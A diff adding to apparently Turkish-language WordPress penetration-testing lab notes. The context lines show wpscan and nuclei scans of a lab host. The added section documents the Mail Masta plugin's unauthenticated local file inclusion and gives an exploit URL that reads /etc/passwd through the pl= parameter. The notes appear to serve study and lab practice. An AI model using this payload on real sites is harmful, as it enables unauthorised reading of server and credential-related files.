@@ -557,3 +557,17 @@ wpscan --url http://blog.inlanefreight.com --enumerate
 nuclei -u  http://154.57.164.78:38680 -t wp-content/plugins/
 
 nuclei -u  http://154.57.164.78:38680 -t http/vulnerabilities/wordpress/
+
+
+
+# 📂 Mail Masta LFI Zafiyeti (Exploit Örneği)
+
+WordPress üzerindeki mail-masta eklentisinde tespit edilen kimlik doğrulaması gerektirmeyen Local File Inclusion (LFI) zafiyetinin sömürülmesinde kullanılan örnek URL:
+```
+/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+```
+[Açıklama ve Detaylar]
+- Zafiyetli Dosya: /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php
+- Parametre: pl=
+- Zafiyet Türü: Unauthenticated Local File Inclusion (LFI)
+- Hedef Dosya: /etc/passwd
